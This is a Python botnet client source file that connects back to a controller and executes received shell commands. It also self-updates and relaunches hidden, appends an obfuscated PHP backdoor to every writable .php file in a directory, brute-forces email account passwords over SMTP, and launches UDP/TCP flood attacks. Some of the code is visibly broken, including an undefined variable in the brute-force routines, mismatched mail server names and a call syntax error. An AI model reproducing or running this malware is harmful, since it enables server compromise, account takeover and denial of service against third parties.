#!/usr/bin/env python3

## MIT License
##
## Copyright (c) 2017 Sayak Brahmachari
##
## Permission is hereby granted, free of charge, to any person obtaining a copy
## of this software and associated documentation files (the "Software"), to
## deal in the Software without restriction, including without limitation the
## rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
## sell copies of the Software, and to permit persons to whom the Software is
## furnished to do so, subject to the following conditions:
##
## The above copyright notice and this permission notice shall be included in
## all copies or substantial portions of the Software.
##
## THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
## IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
## FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
## AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
## LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
## FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
## IN THE SOFTWARE.

import subprocess, os, sys, time, threading, smtplib, random, fnmatch, tempfile
from socket import *
from threading import Thread

if (len(sys.argv) == 3):
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    # Comment the below line and uncomment the next two for a pre-packaged client.
    #sys.exit("Usage: client.py <server ip> <server port>")
    print("Usage: client.py <server ip> <server port>")
    host = '127.0.0.1'
    port = 9999
    print("Using default values - {}:{}".format(host,port))

frozen = getattr(sys, 'frozen', False)

# Used by the Bruteforcer
def product(*args, **kwds):
    pools = list(map(tuple, args)) * kwds.get('repeat', 1)
    result = [[]]
    for pool in pools:
        result = [x+[y] for x in result for y in pool]
    for prod in result:
        yield tuple(prod)

def repeat(object, times=None):
    if times is None:
        while True:
            yield object
    else:
        for i in range(times):
            yield object

# Self Update
temporary = """\
#!/usr/bin/env python3
import os, sys, urllib.request, tempfile

def getURL(owner, repo, name):
    import json

    response = urllib.request.urlopen('https://api.github.com/repos/%s/%s/releases/latest'.%(owner, repo))

    json_val = json.loads(response.read().decode())

    for file in json_val['assets']:
        if name == file['name']: return file['browser_download_url']

def download(url, file):
    import shutil

    with urllib.request.urlopen(url) as response, open(file, 'wb') as out_file:
        shutil.copyfileobj(response, out_file)

if sys.platform == "win32": os.system("taskkill /PID {pid} /F")
else: os.system("kill {pid}")

if {frozen}:
    download(url, "{exe}")
    url = getURL('sayak-brm', 'ShellBot', 'client.exe')
else:
    download(url, "{arg}")
    url = getURL('sayak-brm', 'ShellBot', 'client.py')

if sys.platform == "win32":
    if {frozen}: os.system("{exe} {host} {port}")
    else:
        runner = 'CreateObject("WScript.Shell").Run WScript.Arguments(0), 0'
        with open(tempfile.gettempdir() + "/runner.vbs", "w") as f: f.write(runner)
        os.system(tempfile.gettempdir() + '/runner.vbs "{exe} {arg} {host} {port}"')
else: os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &")
""".format(pid=os.getpid(), frozen=frozen, host=host, port=port, exe=sys.executable, arg=sys.argv[0])

def selfUpdate():
    while 1:
        filename = "%d.py" % random.randint(1, 1000)
        if (not os.path.exists(filename)): break

    with open(filename, "w") as f:
        f.write(temporary)

    if sys.platform == "win32":
        runner = 'CreateObject("WScript.Shell").Run WScript.Arguments(0), 0'
        with open(tempfile.gettempdir() + "/runner.vbs", "w") as f: f.write(runner)
        os.system(tempfile.gettempdir() + '/runner.vbs "{exe} {arg} {host} {port}"'.format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
    else: os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &".format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))

# PHP Infector
backdoor = """
<?php

#TODO: Clean base64id: 55a1983

#`base64_encode`, `base64_decode`, `bindec` and `decbin` Replacements to bypass Disablers-->
$base64ids = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/");

function binToDec($string)
{
    $decimal = "";
    for($i = 0; $i<strlen($string); $i++)
    {
        $dec = intval($string{(strlen($string))-$i-1})*pow(2, $i);
        $decimal+=$dec;
    }
    
    return intval($decimal);
}

function decToBin($dec)
{
    $binary = "";
    $current = intval($dec);

    if ($current == 0)
    {
        return "0";
    }
    
    while (1)
    {
        if ($current == 1)
        {
            $binary="1".$binary;
            break;
        }
        $binary = ($current%%2).$binary;
        $current = intval($current/2);
    }
    
    return $binary;
}

function base64encoding($string)
{
    global $base64ids;

    $binary = "";
    for ($i = 0; $i<strlen($string); $i++)
    {
        $charASCII = ord($string{$i});
        $asciiBIN = decToBin($charASCII);
        if (strlen($asciiBIN) != 8)
        {
            $asciiBIN = str_repeat("0", 8-strlen($asciiBIN)).$asciiBIN;	
        }
        $binary.= $asciiBIN;
    }

    $array = array();
    for ($j = 0; $j<strlen($binary); $j = $j + 6)
    {
        $part = substr($binary, $j, 6);
        array_push($array, $part);
    }

    if (strlen($array[count($array)-1]) != 6)
    {
        $array[count($array)-1] = $array[count($array)-1].str_repeat("0", 6 - strlen($array[count($array)-1]));
    }

    $base64 = "";
    foreach ($array as &$value)
    {
        $value = binToDec($value);
        $value = $base64ids[$value];
        $base64.=$value;
    }

    if ((strlen($base64) %% 4) != 0)
    {
        $base64.=str_repeat("=", 4-(strlen($base64) %% 4));
    }

    return $base64;
}

function base64decoding($string)
{
    global $base64ids;

    $string = str_replace("=", "", $string);

    $binary = "";
    for ($i = 0; $i < strlen($string); $i++)
    {
        $charID = array_search($string{$i}, $base64ids);
        $idBIN = decToBin($charID);
        if (strlen($idBIN) != 6)
        {
            $idBIN = str_repeat("0", 6-strlen($idBIN)).$idBIN;
        }
        $binary.= $idBIN;
    }
    
    if (strlen($binary) %%8 != 0)
    {
        $binary = substr($binary, 0, strlen($binary)-(strlen($binary) %%8));
    }

    $array = array();
    for ($j = 0; $j<strlen($binary); $j = $j + 8)
    {
        $part = substr($binary, $j, 8);
        array_push($array, $part);
    }

    $text = "";
    foreach ($array as &$value)
    {
        $value = binToDec($value);
        $value = chr($value);
        $text.=$value;
    }

    return $text;
}
#<--

#XOR Encryption based on the key `dotcppfile` to decrypt the Built In Shell Codes-->
function sh3ll_this($string)
{
    $key = "dotcppfile";
    $outText = '';

    for($i=0;$i<strlen($string);)
    {
        for($j=0;($j<strlen($key) && $i<strlen($string));$j++,$i++)
        {
            $outText .= $string{$i} ^ $key{$j};
        }
    }
    return base64encoding($outText);
}

function unsh3ll_this($string)
{
    return base64decoding(sh3ll_this(base64decoding($string)));
}
#<--

#Checks if a function is/isn't disabled
$disbls = @ini_get(unsh3ll_this("AAYHAhIcAzYKEAoMAAofHhU=")).','.@ini_get(unsh3ll_this("FxocDAMZCEcJHQEMARcfAkgPGQsHQRYPERMNBQUWEA=="));
if ($disbls == ",")
{
    $disbls = get_cfg_var(unsh3ll_this("AAYHAhIcAzYKEAoMAAofHhU=")).','.get_cfg_var(unsh3ll_this("FxocDAMZCEcJHQEMARcfAkgPGQsHQRYPERMNBQUWEA=="));
}
$disbls = str_replace(" ", "", $disbls);
$disblsArray = explode(",", $disbls);

function checkIt($func)
{
    global $disblsArray;

    foreach ($disblsArray as $value)
    {
        if ($func == $value)
        {
            return False;
        }
    }

    return True;
}
#<--

#Executes system commands -->
function evalRel($command, $id)
{
    global $shell_exec, $exec, $popen, $proc_open, $system, $passthru;
    if (($system == True) && ($id == 2))
    {
        system($command);
    }
    else if(($passthru == True) && ($id == 2))
    {
        passthru($command);
    }
    else if($shell_exec == True)
    {
        return shell_exec($command);
    }
    else if($exec == True)
    {
        return exec($command);
    }
    else if($popen == True)
    {
        $pid = popen( $command,"r");
        while(!feof($pid))
        {
            return fread($pid, 256);
            flush();
            ob_flush();
            usleep(100000);
        }
        pclose($pid);
    }
    else if($proc_open == True)
    {
        $process = proc_open(
            $command,
            array(
                0 => array("pipe", "r"), //STDIN
                1 => array("pipe", "w"), //STDOUT
                2 => array("pipe", "w"), //STDERR
            ),
            $pipes
        );

        if ($process !== false)
        {
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }

        if ($stderr != "")
        {
            return $stderr;
        }
        else
        {
            return $stdout;
        }
    }
    else
    {
        return "False";
    }
}
#<--

#Dynamic Booleans (True=Enabled/False=Disabled)-->
$php_functions = array("exec", "shell_exec", "passthru", "system", "popen", "proc_open");
foreach($php_functions as $function)
{
    if(checkIt($function))
    {
        ${"{$function}"} = True;
    }
    else
    {
        ${"{$function}"} = False;
    }
}
#<--

$checker = evalRel("ps aux | grep '%s %s'", 1);

if (strpos($checker, "python") === False)
{
    evalRel("nohup python %s %s %s > /dev/null 2>&1 &", 2);
}
?>
""" % (host, port, os.path.realpath(__file__), host, port) #TODO: Fix Windows support.

def find_files(directory, pattern):
    for root, dirs, files in os.walk(directory):
        for basename in files:
            if fnmatch.fnmatch(basename, pattern):
                filename = os.path.join(root, basename)
                yield filename

def debackdoor(thedir):
    allphp = find_files(thedir, '*.php')

    for thefile in allphp:
        if ((os.access(thefile, os.R_OK)) and (os.access(thefile, os.W_OK))):
            f = open(thefile, "r")
            inside = f.read()
            f.close()

            if ("#TODO: Clean base64id: 55a1983" not in inside):
                alllines = inside.split('\n')
                if (alllines[len(alllines)-1] != "?>"):
                    global backdoor
                    backdoor = "?>\n%s" % backdoor

                f = open(thefile, "a")
                f.write(backdoor)
                f.close()

def rmbackdoor(thedir):
    allphp = find_files(thedir, '*.php')

    for thefile in allphp:
        if ((os.access(thefile, os.R_OK)) and (os.access(thefile, os.W_OK))):
            f = open(thefile, "r")
            inside = f.read()
            f.close()

            if ("#TODO: Clean base64id: 55a1983" in inside):
                inside = inside.replace(backdoor, "")
                f = open(thefile, "w")
                f.write(inside)
                f.close()

def savePass(password):
    f = open("password.txt", "w")
    f.write(password)
    f.close()

def gmailbruteforce(email, combination, minimum, maximum):
    smtpserver = smtplib.SMTP("smtp.gmail.com",587)
    smtpserver.starttls()
    smtpserver.ehlo()

    found = False

    for n in range(minimum, maximum+1):
        if (found == False):
            for w in product(combination,repeat=n):
                word = ''.join(w)
                try: smtpserver.login(email, password)
                except(smtplib.SMTPAuthenticationError) as msg:
                    if "Please Log" in str(msg):
                        savePass(password)
                        found = True
                        break
        else:
            break

def popularbruteforce(cmd):
    bruteinfo = cmd[1].split(":")
    if cmd[0] == "yahoobruteforce": server = "smtp.mail.yahoo.com"
    elif cmd[0] == "livebruteforce": server = "stmp.aol.com"
    elif cmd[0] == "aolbruteforce": server = "smtp.live.com"
    t = Thread(None,custombruteforce,None,(server, 587, bruteinfo[0],
                                    bruteinfo[1], bruteinfo[2], bruteinfo[3]))
    t.start()
        
def custombruteforce(address, port, email, combination, minimum, maximum):
    smtpserver = smtplib.SMTP(address,int(port))
    smtpserver.starttls()
    smtpserver.ehlo()

    found = False

    for n in range(minimum, maximum+1):
        if (found == False):
            for w in product(combination,repeat=n):
                word = ''.join(w)
                try:
                    smtpserver.login(email, password)
                    savePass(password)
                    found = True
                    break
                except:
                    pass
        else:
            break

class udpFlood(threading.Thread):
    def __init__ (self, victimip, victimport):
        threading.Thread.__init__(self)
        self.victimip = victimip
        self.victimport = victimport

    def run(self):
        timeout = time.time() + 60
        while True:
            test = 0
            if (time.time() <= timeout):
                s = socket(AF_INET, SOCK_DGRAM)
                s.connect((self.victimip, int(self.victimport)))
                tmp = 'A' * 65000
                s.send(bytes(tmp, 'utf-8'))
            else:
                break

class tcpFlood(threading.Thread):
    def __init__ (self, victimip, victimport):
        threading.Thread.__init__(self)
        self.victimip = victimip
        self.victimport = victimport

    def run(self):
        timeout = time.time() + 60
        while True:
            test = 0
            if (time.time() <= timeout):
                s = socket(AF_INET, SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.victimip, int(self.victimport)))
                tmp = 'A' * 65000
                s.send(bytes(tmp, 'utf-8'))
            else:
                break

def udpUnleach(victimip, victimport):
    threads = []
    for i in range(1, 21):
        thread = udpFlood(victimip, victimport)
        thread.start()
        threads.append(thread)
 
    for thread in threads:
        thread.join()

def tcpUnleach(victimip, victimport):
    threads = []
    for i in range(1, 21):
        thread = tcpFlood(victimip, victimport)
        thread.start()
        threads.append(thread)
 
    for thread in threads:
        thread.join()

def main(host, port):
    while 1:
        connected = False
        while 1:
            while (connected == False):
                try:
                    s=socket(AF_INET, SOCK_STREAM)
                    s.connect((host,port))
                    print("[INFO] Connected")
                    connected = True
                except:
                    time.sleep(5)

            try:
                msg=s.recv(20480).decode()
                print(msg)
                allofem = msg.split(";")
                for onebyone in allofem:
                    commands = onebyone.split( )
                    if (commands[0] == "cd"):
                        try:
                            os.chdir(commands[1])
                            s.send(bytes(os.getcwd(), 'utf-8'))
                            print("[INFO] Changed dir to %s" % os.getcwd())
                        except FileNotFoundError:
                            s.send(bytes('[CLIENT - ERROR] Directory missing\n'
                                         + commands[1], 'utf-8'))
                            print("[INFO] %s directory not found" % os.getcwd())
                    elif (commands[0] == "selfupdateall"):
                        selfUpdate()
                        return None
                    elif (commands[0] == "setbackdoor"):
                        try:
                            debackdoor(commands[1])
                            s.send(bytes("[CLIENT] Backdoored\n", 'utf-8'))
                        except:
                            s.send(bytes("[CLIENT] Wrong arguments\n",
                                         'utf-8'))
                    elif (commands[0] == "rmbackdoor"):
                        try:
                            rmbackdoor(commands[1])
                            s.send(bytes("[CLIENT] Malicious PHP Removed\n",
                                         'utf-8'))
                        except:
                            s.send(bytes("[CLIENT] Wrong arguments\n",
                                         'utf-8'))
                    elif (commands[0] == "udpflood"):
                        try:
                            udpinfo = commands[1].split(":")
                            t = Thread(None,udpUnleach,None,(udpinfo[0],
                                                             udpinfo[1]))
                            t.start()
                            s.send(bytes("[CLIENT] Flooding started\n",
                                         'utf-8'))
                        except:
                            s.send(bytes("[CLIENT] Failed to start Flooding\n",
                                         'utf-8'))
                            pass
                    elif (commands[0] == "udpfloodall"):
                        try:
                            udpinfo = commands[1].split(":")
                            t = Thread(None,udpUnleach,None,(udpinfo[0],
                                                             udpinfo[1]))
                            t.start()
                        except:
                            pass
                    elif (commands[0] == "tcpflood"):
                        try:
                            tcpinfo = commands[1].split(":")
                            t = Thread(None,tcpUnleach,None,(tcpinfo[0],
                                                             tcpinfo[1]))
                            t.start()
                            s.send(bytes("[INFO] Flooding started\n",
                                         'utf-8'))
                        except:
                            s.send(bytes("[ERROR] Failed to start Flooding\n",
                                         'utf-8'))
                            pass
                    elif (commands[0] == "tcpfloodall"):
                        try:
                            tcpinfo = commands[1].split(":")
                            t = Thread(None,tcpUnleach,None,(tcpinfo[0],
                                                             tcpinfo[1]))
                            t.start()
                        except:
                            pass
                    elif (commands[0] == "gmailbruteforce"):
                        try:
                            bruteinfo = commands[1].split(":")
                            t = Thread(None,gmailbruteforce,None(bruteinfo[0],
                                    bruteinfo[1], bruteinfo[2], bruteinfo[3]))
                            t.start()
                            s.send(bytes("[CLIENT] Bruteforcing started\n",
                                         'utf-8'))
                        except:
                            s.send(bytes("[CLIENT] Wrong arguments\n",
                                         'utf-8'))
                    elif (commands[0] in ["yahoobruteforce", "livebruteforce", "aolbruteforce"]):
                        try:
                            popularbruteforce(commands)
                            s.send(bytes("[CLIENT] Bruteforcing started\n",
                                         'utf-8'))
                        except:
                            s.send(bytes("[CLIENT] Wrong arguments\n",
                                         'utf-8'))
                    elif (commands[0] == "custombruteforce"):
                        try:
                            bruteinfo = commands[1].split(":")
                            t = Thread(None,custombruteforce,None,
                                       (bruteinfo[0], bruteinfo[1],
                                        bruteinfo[2], bruteinfo[3],
                                        bruteinfo[4], bruteinfo[5]))
                            t.start()
                            s.send(bytes("[CLIENT] Bruteforcing started\n",
                                         'utf-8'))
                        except:
                            s.send(bytes("[CLIENT] Wrong arguments\n",
                                         'utf-8'))
                    elif (commands[0] == "hellows123"):
                        s.send(bytes(os.getcwd(), 'utf-8'))
                    elif (commands[0] == "quit"):
                        s.close()
                        print("[INFO] Connection Closed")
                        break
                    else:
                        thecommand = ' '.join(commands)
                        pipe = subprocess.PIPE
                        comm = subprocess.Popen(thecommand, shell=True,
                                        stdout=pipe, stderr=pipe, stdin=pipe)
                        try:
                            STDOUT, STDERR = comm.communicate(timeout=30)
                            en_STDERR = STDERR.decode()
                            en_STDOUT = STDOUT.decode()
                            if (en_STDERR == ""):
                                if (en_STDOUT != ""):
                                    print(en_STDOUT)
                                    s.send(bytes(en_STDOUT, 'utf-8'))
                                else:
                                    s.send(bytes("[CLIENT] Command Executed",
                                                 'utf-8'))
                            else:
                                print(en_STDERR)
                                s.send(bytes(en_STDERR, 'utf-8'))
                        except subprocess.TimeoutExpired:
                            comm.terminate()
                            comm.kill()
                            s.send(bytes("[CLIENT] Command Timed Out\n",
                                         'utf-8'))
            except KeyboardInterrupt:
                s.close()
                print("[INFO] Connection Closed")
                break
            except Exception as ex:
                s.close()
                print("[INFO] Connection Closed Due to Error:", ex,
                      "\n", __import__('traceback').print_exc())
                break

while 1:
    try:
        main(host, port)
    except:
        time.sleep(5)
